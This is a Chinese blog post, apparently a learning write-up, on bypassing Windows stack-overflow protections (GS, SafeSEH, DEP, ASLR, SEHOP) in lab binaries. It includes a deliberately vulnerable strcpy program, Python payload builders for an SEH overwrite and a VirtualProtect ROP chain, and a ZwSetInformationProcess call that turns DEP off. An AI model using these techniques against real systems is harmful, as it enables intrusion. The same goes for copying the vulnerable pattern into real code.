@@ -1,0 +1,142 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【Win Pwn】基础栈溢出保护绕过</title><meta name="description" content="&lt;p&gt;[Win Pwn] 基础栈溢出利用&lt;/p&gt;
+&lt;p&gt;window下无保护的栈溢出加载shellcode&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】基础栈溢出保护绕过</h3><div class="article__date metadata"><div class="post-info">2023/07/12</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>[Win Pwn] 基础栈溢出利用</p>
+<p>window下无保护的栈溢出加载shellcode</p>
+<span id="more"></span>
+<h1 id="gs"><a class="markdownIt-Anchor" href="#gs"></a> GS</h1>
+<p>GS本质上和Linux GCC中的canary很相似，他在栈帧的结尾（EBP之前）插入一给<code>DWORD</code>类型的值，其副本存在于<code>.data</code>中。</p>
+<p><img src="https://img.joe1sn.top/uploads/big/b3c288e6425290fda519c82da1cad2d8.png" alt="image-20230712223606947" /></p>
+<p>在编译的时候并不会存在GS保护有下面几种情况</p>
+<ul>
+<li>函数不包含缓冲区</li>
+<li>函数被定义为具有变量参数列表</li>
+<li>函数使用无保护的关键字标记</li>
+<li>函数在第一个语句中包含内嵌汇编代码</li>
+<li>缓冲区不是 8 字节类型且大小不大于 4 个字节</li>
+</ul>
+<p>不过仍然可以采用<code>#pragma strict_gs_check </code>强制启用GS保护</p>
+<p><img src="https://img.joe1sn.top/uploads/big/750aa691ce894524469f1b01cd77e309.png" alt="image-20230712230456568" /></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(arry, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span>* str = <span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">	vulfuction(str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.joe1sn.top/uploads/big/51469c6f21d21998618b65975dac846d.png" alt="image-20230712231538824" /></p>
+<p><img src="https://img.joe1sn.top/uploads/big/374afa04add92f9d9522083ab2cb45ac.png" alt="image-20230712231847170" /></p>
+<p>绕过方式要漏洞类型灵活选择</p>
+<ul>
+<li>
+<p>如果是可以泄露那么泄露后拼接再溢出</p>
+</li>
+<li>
+<p>再C++中，<code>struct</code>和<code>class</code>除了访问权限没有不同，那么有机会可以通过修改函数指针（比如虚函数）来进行RCE</p>
+</li>
+<li>
+<p>如果存在任意地址写或者能过写道<code>.data</code>段（比如存在字符串格式化漏洞），可以将对比的cookie设置为特定值</p>
+<p><img src="https://img.joe1sn.top/uploads/big/2b71e1f69270fdfb33074a2c981321bc.png" alt="image-20230713081622450" /></p>
+<p><img src="https://img.joe1sn.top/uploads/big/acce2fb38f039e66a5257f69f0ee9336.png" alt="image-20230713082958542" /></p>
+</li>
+<li>
+<p>GS机制没有存在SEH的保护，所以 <strong>【Win Pwn】基础栈溢出利用</strong> 中的利用手段仍然能够成功，只是溢出长度和ROP的Gadget需要重新设置。</p>
+<p><img src="https://img.joe1sn.top/uploads/big/1e013c016c634b7c9b510528f57f7f11.png" alt="image-20230713000747391" /></p>
+<p><img src="https://img.joe1sn.top/uploads/big/db77970446f88fc23cfb89501cc7f235.png" alt="image-20230713000801579" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x160</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9e\x26\x41\x00&quot;</span>    <span class="comment">#0041269E</span></span><br><span class="line"></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x2c\x07\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x64c;//sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.joe1sn.top/uploads/big/2a8a0b38238c8d4b55c053daf8d7f822.png" alt="image-20230713081020816" /></p>
+</li>
+</ul>
+<h1 id="safeseh"><a class="markdownIt-Anchor" href="#safeseh"></a> SafeSEH</h1>
+<p>0day那本书上信息有点…过时了，这里可以参考微软的官方定义<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/build/reference/safeseh-image-has-safe-exception-handlers?view=msvc-170"><code>/SAFESEH</code>（映像具有安全异常处理程序）</a>，主要识别方法就是在<code>.rdata</code>中存在<code>IMAGE_LOAD_CONFIG_DIRECTORY32_2</code></p>
+<p><img src="https://img.joe1sn.top/uploads/big/79a4334e1d29d557df4e66527b98c69a.png" alt="image-20230713090918752" /></p>
+<p>通过<code>RtlDispatchException</code>函数实现</p>
+<p><img src="https://img.joe1sn.top/uploads/big/dae06c1a5f9088ea1eed84fbfbbfca68.png" alt="image-20230713091103788" /></p>
+<p>比较通杀的方法就是</p>
+<ul>
+<li>不使用SEH</li>
+<li>在堆区上布置shellcode然后执行</li>
+</ul>
+<p>这里改动一下源代码</p>
+<ol>
+<li>
+<p>把SEH的地址手动改为堆地址</p>
+<p><img src="https://img.joe1sn.top/uploads/big/e8047ce0aa682162a04e464d06cb447e.png" alt="image-20230713093246026" /></p>
+</li>
+<li>
+<p>经过校验后直接到堆中执行了</p>
+<p><img src="https://img.joe1sn.top/uploads/big/23640b0c2f51bb770ee04be0cd63bf20.png" alt="image-20230713093529382" /></p>
+<p><img src="https://img.joe1sn.top/uploads/big/5b3318808a12b59116c30bef0ff5c1ac.png" alt="image-20230713093751706" /></p>
+<p>P3是重启了一次后截图，地址可能会不一样</p>
+</li>
+</ol>
+<p>总结一下就是地址的ROP必须符合验证的权限，但是<strong>没有开启SafeSEH的DLL文件中的Gadget</strong>、没有<strong>DEP时候的堆地址</strong>都可以使用。</p>
+<h1 id="dep"><a class="markdownIt-Anchor" href="#dep"></a> DEP</h1>
+<p>DEP是类似于Windows上的NX，作用是禁止堆栈的数据拥有执行的权限，避免了Shellcode直接执行。</p>
+<p>操作系统通过设置内存页的 NX/XD 属性标记，来指明不能从该内存执行代码。为了实现 这个功能，需要在内存的页面表（Page T able）中加入一个特殊的标识位（NX/XD）来标识是 否允许在该页上执行指令。当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。</p>
+<p>关于NX保护也可以手动查看</p>
+<p><img src="https://img.joe1sn.top/uploads/big/e91415d0cafe28798ab17cbdfff475bb.png" alt="image-20230713095059334" /></p>
+<p>只编译DEP可能还需要关闭运行时检查</p>
+<p><img src="https://img.joe1sn.top/uploads/big/2ace5c957abc3787e65922ccf1a7e343.png" alt="image-20230713133201425" /></p>
+<p>主要思路就是Ret2Libc</p>
+<ul>
+<li>
+<p>调用<code>ZwSetInformationProcess</code>关闭DEP</p>
+<p>在之前的《【win内核原理与实现】II. 进程与线程》中提到过<code>_KPROCESS</code>存在<code>ExecuteOptions</code></p>
+<p><img src="https://img.joe1sn.top/uploads/big/b4d51d5aa29ea68f1f9a32053f3e6b20.png" alt="image-20230713100758503" /></p>
+<p>我并没有在微软的官网上找到该结构体的说明，但是可以通过之前他们的逆向结果找到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pos0 ExecuteDisable        :<span class="number">1b</span>it </span><br><span class="line">Pos1 ExecuteEnable         :<span class="number">1b</span>it </span><br><span class="line">Pos2 DisableThunkEmulation :<span class="number">1b</span>it </span><br><span class="line">Pos3 Permanent             :<span class="number">1b</span>it </span><br><span class="line">Pos4 ExecuteDispatchEnable :<span class="number">1b</span>it </span><br><span class="line">Pos5 ImageDispatchEnable   :<span class="number">1b</span>it </span><br><span class="line">Pos6 Spare                 :<span class="number">2b</span>it</span><br></pre></td></tr></table></figure>
+<p>当前进程 DEP 开启时 ExecuteDisable 位被置 1，当 进程 DEP 关闭时 ExecuteEnable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的， Permanent 被置 1 后表示这些标志都不能再被修改。真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02（二进制为 00000010）就可以将 ExecuteEnable 置为 1。</p>
+<p>使用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; </span><br><span class="line">ZwSetInformationProcess( </span><br><span class="line"> NtCurrentProcess(),    <span class="comment">// (HANDLE)-1 </span></span><br><span class="line"> ProcessExecuteFlags,   <span class="comment">// 0x22 </span></span><br><span class="line"> &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2 </span></span><br><span class="line"> <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4 </span></span><br></pre></td></tr></table></figure>
+<p>就可以关掉DEP保护了，在0day书中介绍了3种直接利用兼容性异常而导致DEP关闭的方法</p>
+<blockquote>
+<p>（1）当 DLL 受 SafeDisc 版权保护系统保护时；</p>
+<p>（2）当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；</p>
+<p>（3）Windows V ista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE  \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识 出不需要启动 DEP 的模块时</p>
+</blockquote>
+<p>很可惜在windows10中这些情况几乎不会出现，所以方法不适用</p>
+</li>
+</ul>
+<p>这两种是我比较喜欢用的，因为可以和免杀结合在一起</p>
+<p>他们的基础就是类似LinuxPwn中的ROP构造，这里我使用的是32下，cdcle调用方式，使用栈传参</p>
+<ul>
+<li>
+<p><code>VirtualProtect</code>改写内存权限</p>
+<p>关于函数的用法：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">virtualProtect 函数 (memoryapi.h)</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  [in]  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  [out] PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<p><code>lpAddress</code>:  要改变属性的内存起始地址。</p>
+<p><code>dwSize</code>:  要改变属性的内存区域大小。</p>
+<p><code>flNewProtect</code>:  内存新的属性类型，设置为 PAGE_EXECUTE_READWRITE（0x40）时该 内存页为可读可写可执行。</p>
+<p><code>pflOldProtect</code>:  内存原始属性类型保存地址。 修改内存属性成功时函数返回非 0，修改失败时返回 0。</p>
+<p>不过API位于的是<code>shell32.dll</code>当中，所以要添加上<code>HINSTANCE hInst = LoadLibrary(L&quot;shell32.dll&quot;);</code></p>
+<p>由于ROP依赖于函数调用的传参方式，下面是一个经典的传参</p>
+<p><img src="https://img.joe1sn.top/uploads/big/ed81eaf5da5e42ca1bfb625c694f5216.png" alt="image-20230713193232979" /></p>
+<p>ROP时栈的结构</p>
+<p><img src="https://img.joe1sn.top/uploads/big/54294658ba1a5556fff36100908b0736.png" alt="image-20230713193507826" /></p>
+<p>由于没有泄露点，所以只能在调试的时候修改。也可以使用Gadget来构造，比如说通过<code>ESP</code>相关得到栈地址之类的。（但是得到<code>VirtualProtect</code>就太困难了）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload = offset </span><br><span class="line">payload += <span class="string">b&quot;\x90&quot;</span>*<span class="number">4</span>    <span class="comment">#VirtualProtect</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\x80&quot;</span>*<span class="number">4</span>    <span class="comment">#Shellcode Address</span></span><br><span class="line">payload += <span class="string">b&quot;\xff\x00\x00\x00&quot;</span>  <span class="comment">#Address Length</span></span><br><span class="line">payload += <span class="string">b&quot;\x40\x00\x00\x00&quot;</span>  <span class="comment">#PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += <span class="string">b&quot;\x38\xa0\x41\x00&quot;</span>  <span class="comment">#0041A038</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.joe1sn.top/uploads/big/a68c0c2af42ae0d17c84c82d9d2db5b0.png" alt="image-20230713195003967" /></p>
+</li>
+<li>
+<p><code>VirtualAlloc</code>来开辟可执行的内存然后执行shellcode</p>
+<p>和<code>VirtualProtect</code>一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中</p>
+</li>
+</ul>
+<h1 id="aslr"><a class="markdownIt-Anchor" href="#aslr"></a> ASLR</h1>
+<p>在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。</p>
+<p>绕过思路主要有</p>
+<ul>
+<li>低位覆盖，最低位是固定的</li>
+<li>堆喷，将内存初始化后的<code>\x0c</code>强制写为<code>\x90</code>（<code>nop</code>的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面）</li>
+</ul>
+<h1 id="sehop"><a class="markdownIt-Anchor" href="#sehop"></a> SEHOP</h1>
+<p>由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。</p>
+<p><img src="https://img.joe1sn.top/uploads/big/5319fbefe0a46939d4d853e4debc9e4f.png" alt="image-20230713201332561" /></p>
+<p>最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了</p>
+<p>由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH</p>
+<p><img src="https://img.joe1sn.top/uploads/big/f99910e357fc63d939677ac967101038.png" alt="image-20230713201648035" /></p>
+<h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1>
+<p>《0day安全：软件漏洞分析技术》</p>
+</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
+(function () {
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__next" href="/2023/07/08/win-pwn-stack/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2023 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
